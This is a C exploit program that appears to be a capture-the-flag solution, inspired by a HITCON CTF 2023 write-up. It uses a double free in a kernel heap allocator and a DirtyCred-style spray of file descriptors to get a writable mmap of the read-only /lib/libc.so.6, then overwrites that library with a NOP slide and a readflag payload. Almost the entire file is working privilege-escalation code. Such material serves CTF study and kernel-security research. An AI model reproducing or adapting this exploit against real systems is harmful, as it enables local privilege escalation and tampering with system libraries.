#include "libs/pwn.h"
#include "libs/readflag.h"
#include <stdint.h>
#include <unistd.h>

#define SPRAY_VULN 0x1000
#define FS_CONTEXT_SLAB_SIZE 0x100
#define NUM_SPRAY_FDS_1 0xc00
#define NUM_SPRAY_FDS_2 0x300
#define PASSWD_SPRAY_FDS 0x300
#define NOP_SLIDE_SIZE 0x50000

/*
 * inspired by https://chovid99.github.io/posts/hitcon-ctf-2023/
 */

int main(void) {

  int tmp_a;
  int freed_fd = -1;
  void *keap_ptr;
  char buf[FS_CONTEXT_SLAB_SIZE] = {0};

  lstage("Initial setup");

  rlimit_increase(RLIMIT_NOFILE);
  // Pin CPU
  pin_cpu(0, 0);
  init();

  lstage("START");

  // create target file
  tmp_a = SYSCHK(
      open("/tmp/chovid99", O_RDWR | O_CREAT | O_TRUNC, S_IRUSR | S_IWUSR));
  SYSCHK(close(tmp_a));

  linfo("create and free heap allocation for double free later");
  void *keap_ptrs[SPRAY_VULN] = {0};
  for (int i = 0; i < SPRAY_VULN; i++) {
    keap_ptrs[i] = keap_malloc(FS_CONTEXT_SLAB_SIZE, GFP_KERNEL_ACCOUNT);
  }

  for (int i = 0; i < SPRAY_VULN; i++) {
    keap_free(keap_ptrs[i]);
    if (i == SPRAY_VULN / 2) {
      keap_ptr = keap_ptrs[i];
    }
  }
  // spray

  /*******************************
   * DIRTY CRED                  *
   *******************************/

  lstage("Start the main exploit");

  linfo("Spray FDs");
  int spray_fds[NUM_SPRAY_FDS_1];
  for (int i = 0; i < NUM_SPRAY_FDS_1; i++) {
    spray_fds[i] = SYSCHK(open("/tmp/chovid99", O_RDWR)); // /tmp/a is a writable file
    if (spray_fds[i] == -1) {
      puts("Failed to open FDs");
      return EXIT_FAILURE;
    }
  }

  linfo("Free one of the FDs via double free keap");
#ifdef DEBUG
  keap_read(keap_ptr, buf, FS_CONTEXT_SLAB_SIZE);
  print_hex(buf, FS_CONTEXT_SLAB_SIZE);
#endif
  keap_free(keap_ptr);
  // After: 1 fd but pointed chunk is free

  // Spray to replace the previously freed chunk
  // Set the lseek to 0x8, so that we can find easily the fd
  linfo("Find the freed FD using lseek");
  int spray_fds_2[NUM_SPRAY_FDS_2];
  for (int i = 0; i < NUM_SPRAY_FDS_2; i++) {
    spray_fds_2[i] = SYSCHK(open("/tmp/chovid99", O_RDWR));
    SYSCHK(lseek(spray_fds_2[i], 0x8, SEEK_SET));
  }
  // After: 2 fd 1 refcount (Because new file)

  // The freed fd will have lseek value set to 0x8. Try to find it.
  for (int i = 0; i < NUM_SPRAY_FDS_1; i++) {
    if (SYSCHK(lseek(spray_fds[i], 0, SEEK_CUR)) == 8) {
      freed_fd = spray_fds[i];
      SYSCHK(lseek(freed_fd, 0x0, SEEK_SET));
      linfo("Found freed fd: %d\n", freed_fd);
      break;
    }
  }

#ifdef DEBUG
  keap_read(keap_ptr, buf, FS_CONTEXT_SLAB_SIZE);
  print_hex(buf, FS_CONTEXT_SLAB_SIZE);
#endif

  if (freed_fd == -1) {
    puts("Failed to find FD");
    return EXIT_FAILURE;
  }

  // mmap trick instead of race with write
  lstage("DirtyCred via mmap");
  char *file_mmap = mmap(NULL, NOP_SLIDE_SIZE + sizeof(readflag),
                         PROT_READ | PROT_WRITE, MAP_SHARED, freed_fd, 0);
  CHK(file_mmap != MAP_FAILED);
  // After: 3 fd 2 refcount (Because new file)

  SYSCHK(close(freed_fd));
  // After: 2 fd 1 refcount (Because new file)

  for (int i = 0; i < NUM_SPRAY_FDS_2; i++) {
    SYSCHK(close(spray_fds_2[i]));
  }
  // After: 1 fd 0 refcount (Because new file)
  // Effect: FD in mmap (which is writeable) can be replaced with RDONLY file

  for (int i = 0; i < PASSWD_SPRAY_FDS; i++) {
    open("/lib/libc.so.6", O_RDONLY);
  }
// After: 2 fd 1 refcount (but writeable due to mmap)
#ifdef DEBUG
  keap_read(keap_ptr, buf, FS_CONTEXT_SLAB_SIZE);
  print_hex(buf, FS_CONTEXT_SLAB_SIZE);
#endif

  linfo("cause faults in file_mmap");
  for (int i = 0; i < NOP_SLIDE_SIZE + sizeof(readflag); i += 8) {
    if (*(uint64_t *)&file_mmap[i] == 0x6fe1be2)
      linfo("wtf");
  }

  memset(file_mmap, '\x90', NOP_SLIDE_SIZE);
  memcpy(file_mmap + NOP_SLIDE_SIZE, readflag, sizeof(readflag));
  lstage("Finished! Reading Flag");

  return 0;
}
